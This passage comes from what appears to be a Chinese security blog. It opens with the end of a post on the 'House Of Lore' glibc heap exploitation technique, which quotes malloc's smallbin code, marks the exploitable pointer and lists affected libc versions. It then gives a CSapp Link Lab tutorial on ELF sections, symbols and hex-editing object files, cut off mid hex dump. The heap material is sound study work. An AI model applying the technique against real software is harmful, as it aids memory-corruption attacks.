(nb))</span><br><span class="line">    <span class="comment">// 检验需要分配的大小是不是smallbin大小</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">          <span class="comment">// 通过last函数查找到最后一个free chunk</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk; <span class="comment">/* 漏洞点 */</span></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">          <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>漏洞的问题就在于<code>bck = victim-&gt;bk</code>，这句话将这个 chunk 的BK提取了出来，并且在之后使得<code>bin-&gt;bk = bck</code> ，这样的话BK指针所指向的 chunk 就被放入了 smallbin，之后的 malloc 就可以将其 malloc 出来了 </p>
<h2 id="版本对-House-Of-Lore-的影响"><a href="#版本对-House-Of-Lore-的影响" class="headerlink" title="版本对 House Of Lore 的影响"></a>版本对 House Of Lore 的影响</h2><p><strong>libc-2.23</strong>（只有上文提及的基础检查）</p>
<p><strong>libc-2.27</strong>（只有上文提及的基础检查，但是需要绕过 cache）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br></pre></td></tr></table></figure>
<p>检查 fakechunk-&gt;FD 是不是 victim_chunk</p>
<p><strong>libc-2.31</strong>（House Of Lore 已经失效）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/09/CSapp-Link%20Lab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/09/CSapp-Link%20Lab/" class="post-title-link" itemprop="url">CSapp-Link Lab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-09 14:54:54" itemprop="dateCreated datePublished" datetime="2022-03-09T14:54:54+08:00">2022-03-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-10 00:08:48" itemprop="dateModified" datetime="2022-10-10T00:08:48+08:00">2022-10-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>39k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>35 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Link-Lab"><a href="#Link-Lab" class="headerlink" title="Link Lab"></a>Link Lab</h2><p>CMU无此实验，HIT增加</p>
<p>每个实验阶段考察 ELF 文件组成与程序链接过程的不同方面知识</p>
<ul>
<li>阶段1：全局变量 &lt;=&gt; 数据节</li>
<li>阶段2：指令 &lt;=&gt; 代码节</li>
<li>阶段3：符号解析</li>
<li>阶段4：switch语句与重定位</li>
<li>阶段5：重定位</li>
</ul>
<h2 id="实验文件"><a href="#实验文件" class="headerlink" title="实验文件"></a>实验文件</h2><ul>
<li>main.o：主程序的可重定位目标模块（实验中无需修改）</li>
<li>phase1.o …….. phase5.o：各阶段实验所针对的二进制可重定位目标模块，需在相应实验阶段中予以修改或补充</li>
<li>linkbombn：验证文件</li>
</ul>
<p>在实验中的每一阶段，按照阶段的目标要求修改相应可重定位二进制目标模块 phasen.o 后，使用如下命令生成可执行程序 linkbomb：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux &gt; gcc -m32 -o linkbomb main.o phase[n].o </span><br><span class="line">./linkbomb</span><br></pre></td></tr></table></figure>
<h2 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h2><p><strong>hexedit</strong></p>
<p>hexedit 不仅仅是十六进制编辑器，它提供了获取文件差异的信息，可用于比较二进制文件，它的用户界面基于 ncurses</p>
<p>我们可以像下面这样安装它：（可能需要 root 权限）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux &gt; apt install hexedit</span><br></pre></td></tr></table></figure>
<p>打开终端输入以下指令即可运行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux &gt; hexedit filename</span><br></pre></td></tr></table></figure>
<p>用方向键移动，ctrl+w保存，ctrl+x退出，man hexedit </p>
<p><strong>readelf</strong>  </p>
<ul>
<li>-a —all        等同于同时使用：-h -l -S -s -r -d -V -A -l</li>
<li>-h —file-header    显示ELF文件头</li>
<li>-l —program-headers    显示程序头</li>
<li>-S —section-headers    显示节头</li>
<li>-t —section-details    显示节详细信息</li>
<li>-s —syms        显示符号表（symbol table）</li>
<li>-r —relocs        显示重定位信息</li>
<li>-d —dynamic    显示动态节（dynamic section）</li>
<li>-x —hex-dump=<number|name>    以字节形式显示输出<number|name>指定节的内容</number|name></number|name></li>
<li>-p —string-dump=<number|name>     以字符串形式显示输出<number|name>指定节的内容</number|name></number|name></li>
<li>-R —relocated-dump=<number|name>     以重定位后的字节形式显示输出<number|name>指定节内容</number|name></number|name></li>
</ul>
<h2 id="符号相关知识"><a href="#符号相关知识" class="headerlink" title="符号相关知识"></a>符号相关知识</h2><p><strong>符号表</strong></p>
<p>在计算机科学中，符号表是一种用于语言翻译器（例如：编译器和解释器）中的数据结构，在符号表中，程序源代码中的每个标识符都和它的声明或使用信息绑定在一起，比如其数据类型、作用域以及内存地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        Elf32_Word    st_name;      <span class="comment">/* 符号对应字符串在strtab节中的偏移量 */</span> </span><br><span class="line">        Elf32_Word    st_value;     <span class="comment">/* 在对应节中的偏移量，可执行文件中是虚拟地址 */</span></span><br><span class="line">        Elf32_Word    st_size;      <span class="comment">/* 符号对应目标所占字节数 */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span>   type: <span class="number">4</span>,    <span class="comment">/* 符号对应目标的类型：数据、函数、源文件、节 */</span></span><br><span class="line">              		 binding: <span class="number">4</span>;    <span class="comment">/* 符号类别：全局符号、局部符号、弱符号 */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span>   st_other;</span><br><span class="line">        Elf32_Section   st_shndx;    <span class="comment">/* 符号对应目标所在的节，或其他情况 */</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure>
<p><strong>散列表</strong></p>
<p>散列表是用来实现符号表的一种常用技术，编译器可能会使用一个很大的符号表来包含所有的符号，或是针对不同的作用域使用层次结构的多个独立的符号表</p>
<p><strong>符号</strong></p>
<ul>
<li>Global symbols（模块内部定义的全局符号）<ul>
<li>由模块m定义并能被其他模块引用的符号（非static函数，非static全局变量）</li>
</ul>
</li>
<li>External symbols（外部定义的全局符号）<ul>
<li>由其他模块定义并被模块m引用的全局符号</li>
</ul>
</li>
<li>Local symbols（本模块的局部符号）<ul>
<li>仅由模块m定义和引用的本地符号（带有static的函数和全局变量）</li>
<li>注意：局部变量不会在过程外被引用（分配在栈中），因此不是符号定义</li>
</ul>
</li>
</ul>
<p><strong>符号变量</strong></p>
<p>自动变量（动态局部变量）：auto </p>
<ul>
<li>离开函数，值就消失</li>
<li>不写 static 就默认是 auto</li>
</ul>
<p>静态局部变量：static </p>
<ul>
<li>离开函数，值任然保留</li>
<li>变量的值只在函数内部生效</li>
<li>带有 static 的变量只会初始化一次（数据存储在 data 段）</li>
<li>当上一级函数多次调用本函数时，带有 static 的变量数值不变（并且不会进行初始化）</li>
</ul>
<p>寄存器变量：register</p>
<ul>
<li>离开函数，值就消失</li>
<li>变量的值只在函数内部生效</li>
</ul>
<p>全局变量：在 main 之外</p>
<ul>
<li>允许 main 中所有函数访问</li>
<li>允许外部其他文件访问</li>
</ul>
<p>静态全局变量：在 main 之外，static</p>
<ul>
<li>允许 main 中所有函数访问</li>
<li>变量的值只在文件内部生效</li>
</ul>
<h2 id="节简析"><a href="#节简析" class="headerlink" title="节简析"></a>节简析</h2><p>使用目标文件的节头表，可以定位文件的所有节，节头表是 <code>Elf32_Shdr</code> 或 <code>Elf64_Shdr</code> 结构的数组</p>
<p><strong>节头</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        elf32_Word      sh_name; <span class="comment">/* 节的名称，此成员值是节头字符串表节的索引，用于指定以空字符结尾的字符串的位置 */</span></span><br><span class="line">        Elf32_Word      sh_type; <span class="comment">/* 用于将节的内容和语义分类 */</span></span><br><span class="line">        Elf32_Word      sh_flags; <span class="comment">/* 节可支持用于说明杂项属性的1位标志 */</span></span><br><span class="line">        Elf32_Addr      sh_addr; <span class="comment">/* 如果节显示在进程的内存映像中，则此成员会指定节的第一个字节所在的地址 */</span></span><br><span class="line">        Elf32_Off       sh_offset; <span class="comment">/* 从文件的起始位置到节中第一个字节的字节偏移 */</span></span><br><span class="line">        Elf32_Word      sh_size; <span class="comment">/* 节的大小 */</span></span><br><span class="line">        Elf32_Word      sh_link; <span class="comment">/* 节头表索引链接，其解释依赖于节类型 */</span></span><br><span class="line">        Elf32_Word      sh_info; <span class="comment">/* 额外信息，其解释依赖于节类型 */</span></span><br><span class="line">        Elf32_Word      sh_addralign; <span class="comment">/* 一些节具有地址对齐约束 */</span></span><br><span class="line">        Elf32_Word      sh_entsize; <span class="comment">/* 指定每一项的大小(一些节包含固定大小的项的表) */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        Elf64_Word      sh_name;</span><br><span class="line">        Elf64_Word      sh_type;</span><br><span class="line">        Elf64_Xword     sh_flags;</span><br><span class="line">        Elf64_Addr      sh_addr;</span><br><span class="line">        Elf64_Off       sh_offset;</span><br><span class="line">        Elf64_Xword     sh_size;</span><br><span class="line">        Elf64_Word      sh_link;</span><br><span class="line">        Elf64_Word      sh_info;</span><br><span class="line">        Elf64_Xword     sh_addralign;</span><br><span class="line">        Elf64_Xword     sh_entsize;</span><br><span class="line">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-94076.html">节 - 链接程序和库指南</a> </p>
<p><strong>节分配</strong></p>
<img src="/2022/03/09/CSapp-Link%20Lab/1646800862254.png" class width="1646800862254"> 
<p><strong>节简述</strong></p>
 <img src="/2022/03/09/CSapp-Link%20Lab/1646800924153.png" class width="1646800924153"> 
<ul>
<li>ELF头：包括16字节的标识信息，文件类型（.o，exec，.so），机器类型（如Intel 80386），节头表的偏移，节头表的表项大小及表项个数 </li>
<li>.text节：编译后的代码部分 </li>
<li>.rodata节：只读数据，如 printf 用到的格式串，switch 跳转表等</li>
<li>.data节：已初始化的全局变量和静态变量</li>
<li>.bss节：未初始化全局变量和静态变量，仅是占位符，不占据任何磁盘空间，区分初始化和非初始化是为了空间效率</li>
<li>.symtab节：存放函数和全局变量（符号表）的信息，它不包括局部变量</li>
<li>.rel.text节：.text节的重定位信息，用于重新修改代码段的指令中的地址信息</li>
<li>.debug节：调试用的符号表（gcc -g） </li>
<li>.strtab节：包含 .symtab节和 .debug节 中的符号及节名 </li>
</ul>
<p><strong>示例</strong>（可能会有不同，比如：在我的电脑上 .data 为第4节）</p>
<img src="/2022/03/09/CSapp-Link%20Lab/1646632648612.png" class width="1646632648612"> 
<ul>
<li>ABS：表示不该被重定位 </li>
<li>UND：表示未定义 </li>
<li>COM：表示未初始化数据（.bss） </li>
<li>value：表示对齐要求，size：给出最小大小 </li>
</ul>
<h2 id="编译器驱动程序"><a href="#编译器驱动程序" class="headerlink" title="编译器驱动程序"></a>编译器驱动程序</h2><p>编译器驱动程序的工作：调用语言预处理器，编译器，汇编器，链接器</p>
<img src="/2022/03/09/CSapp-Link%20Lab/1641118618666-1646286364492.png" class width="1641118618666"> 
<img src="/2022/03/09/CSapp-Link%20Lab/1646665002297.png" class width="1646665002297"> 
<p>详细过程：</p>
<ul>
<li><strong>预处理阶段</strong>：预处理器（cpp）根据以字符 “#” 开头的命令，修改原始的 C 程序（比如 hello.c 中第 1 行的<code>#include</code>命令告诉预处理器读取系统头文件 stdio.h 的内容）并把它直接插入程序文本中，结果就得到了另一个 C 程序<ul>
<li>通常是以 .i 作为文件扩展名</li>
<li>所谓的头文件，里面装的其实就是函数声明（libc库中的函数：scanf，printf 等）</li>
</ul>
</li>
<li><strong>编译阶段</strong>：编译器（ccl）将文本文件 hello.i 翻译成文本文件 hello.s，它包含一个汇编语言程序<ul>
<li>.s 文件其实就是装有汇编语言的文件</li>
</ul>
</li>
<li><strong>汇编阶段</strong>：汇编器（as）将 hello.s 翻译成机器语言指令，把这些指令打包成一种叫做可重定位目标程序（relocatable object program）的格式，并将结果保存在目标文件 hello.o 中<ul>
<li>hello.o 文件是一个二进制文件，它包含的 17 个字节是函数 main 的指令编码</li>
<li>如果我们在文本编辑器中打开 hello.o文件，将看到一堆乱码（二进制）</li>
</ul>
</li>
<li><strong>链接阶段</strong>：链接器（ld）就负责处理合并各个 hello.o 文件，结果就得到 hello 文件，它是一个可执行目标文件（或者简称为可执行文件），可以被加载到内存中，由系统执行<ul>
<li>请注意，hello 程序调用了 printf 函数，它是每个 C 编译器都提供的标准 C 库中的一个函数</li>
<li>printf 函数存在于一个名为 printf.o 的单独的预编译好了的目标文件中，而这个文件必须以某种方式合并到我们的 hello.o 程序中</li>
<li>通过修改 hello.o 可以影响最终文件 hello 的效果</li>
</ul>
</li>
</ul>
<h2 id="强符号与弱符号"><a href="#强符号与弱符号" class="headerlink" title="强符号与弱符号"></a>强符号与弱符号</h2><p>在C语言中：</p>
<ul>
<li>函数和初始化的全局变量（包括显示初始化为0）是强符号</li>
<li>未初始化的全局变量是弱符号 </li>
</ul>
<p>对于它们，下列三条规则使用：</p>
<ul>
<li>同名的强符号只能有一个，否则编译器报”重复定义”错误</li>
<li>允许一个强符号和多个弱符号，但定义会选择强符号的</li>
<li>当有多个弱符号相同时，链接器选择最先出现那个，也就是与链接顺序有关</li>
</ul>
<h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><p>步骤一：使用 readelf 和 bjdump 工具，首先确定 printf（具体为 puts ）输出函数的第2个调用参数对应的字符串地址（在 .data 节中）</p>
<p>步骤二：使用readelf 或 objdump 工具，查看 .data 节中的字符串内容并与未修改的 phase1.o 链接后程序输出的字符串比较，确定该字符串为修改的目标</p>
<p>步骤三：使用 hexedit 或自己写程序该字符串前若干字符替换为目标学号中的字符</p>
<p>实验一的程序框架：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span> </span></span><br><span class="line"><span class="keyword">void</span> (*phase)();   <span class="comment">/*初始化为0*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[] )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( phase )</span><br><span class="line">               (*phase)();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;To run lab, please link the relevant object module with the main module.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接运行输出这个结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l1] ./linkbomb1 </span><br><span class="line"><span class="number">173000209U</span>Vv00d3vyFALuMYjxuPCr5m38uiiwLQwlzRxr80BxYnv7r6zz9aChMvWou2DL9e4tc6EidF1olhqrhH3gxYChAckMo7uMXJHwSDfiEmlYH	hhJElIl RzCWKPcuNvdHAIt	h7487zkd39QJEm4Rqwyer	L <span class="number">0</span>gauz1N2w9g PyaHAl</span><br></pre></td></tr></table></figure>
<p>现在先收集信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l1] readelf -s phase1.o</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">17</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS phase1.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">2</span> </span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">4</span> </span><br><span class="line">     <span class="number">4</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">5</span> </span><br><span class="line">     <span class="number">5</span>: <span class="number">00000000</span>   <span class="number">200</span> OBJECT  LOCAL  DEFAULT    <span class="number">4</span> ALJsLxmF <span class="comment">// target</span></span><br><span class="line">     <span class="number">6</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">6</span> </span><br><span class="line">     <span class="number">7</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">8</span> </span><br><span class="line">     <span class="number">8</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">10</span> </span><br><span class="line">     <span class="number">9</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">11</span> </span><br><span class="line">    <span class="number">10</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">9</span> </span><br><span class="line">    <span class="number">11</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> </span><br><span class="line">    <span class="number">12</span>: <span class="number">00000000</span>    <span class="number">43</span> FUNC    GLOBAL DEFAULT    <span class="number">2</span> do_phase</span><br><span class="line">    <span class="number">13</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN     <span class="number">8</span> __x86.get_pc_thunk.ax</span><br><span class="line">    <span class="number">14</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND _GLOBAL_OFFSET_TABLE_ <span class="comment">// GOT表</span></span><br><span class="line">    <span class="number">15</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">puts</span></span><br><span class="line">    <span class="number">16</span>: <span class="number">00000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">6</span> phase</span><br></pre></td></tr></table></figure>
<p>发现可疑目标：ALJsLxmF</p>
<ul>
<li>Bind：LOCAL（局部符号）</li>
<li>Ndx：4（第4节 .data）</li>
<li>Value：0（节内偏移为0）</li>
<li>Type：OBJECT（全局变量）</li>
</ul>
<p>局部全局变量，大小为 200，位于 .data 节，节内偏移为 0</p>
<p>接下来只需要查看 data 节在 .o 文件中的偏移是多少应该就可了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l1] readelf -S phase1.o</span><br><span class="line">There are <span class="number">16</span> section headers, starting at offset <span class="number">0x3f0</span>:</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .group            GROUP           <span class="number">00000000</span> <span class="number">000034</span> <span class="number">000008</span> <span class="number">04</span>     <span class="number">13</span>  <span class="number">13</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">2</span>] .text             PROGBITS        <span class="number">00000000</span> <span class="number">00003</span>c <span class="number">00002b</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">3</span>] .rel.text         REL             <span class="number">00000000</span> <span class="number">000328</span> <span class="number">000020</span> <span class="number">08</span>   I <span class="number">13</span>   <span class="number">2</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">4</span>] .data             PROGBITS        <span class="number">00000000</span> <span class="number">000080</span> <span class="number">0000</span>c8 <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span> <span class="number">32</span></span><br><span class="line">  [ <span class="number">5</span>] .bss              NOBITS          <span class="number">00000000</span> <span class="number">000148</span> <span class="number">000000</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .data.rel.local   PROGBITS        <span class="number">00000000</span> <span class="number">000148</span> <span class="number">000004</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>.data节 偏移为“0x80”，在 HexEdit 中定为偏移为“0x80+0x0”（节偏移+节内偏移）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span>   <span class="number">7F</span> <span class="number">45</span> <span class="number">4</span>C <span class="number">46</span>  <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  .ELF............</span><br><span class="line"><span class="number">00000010</span>   <span class="number">01</span> <span class="number">00</span> <span class="number">03</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00000020</span>   F0 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">34</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">28</span> <span class="number">00</span>  .......<span class="number">.4</span>.....(.</span><br><span class="line"><span class="number">00000030</span>   <span class="number">10</span> <span class="number">00</span> <span class="number">0F</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">55</span> <span class="number">89</span> E5 <span class="number">53</span>  ............U..S</span><br><span class="line"><span class="number">00000040</span>   <span class="number">83</span> EC <span class="number">04</span> E8  FC FF FF FF  <span class="number">05</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">8</span>D <span class="number">90</span> <span class="number">11</span>  ................</span><br><span class="line"><span class="number">00000050</span>   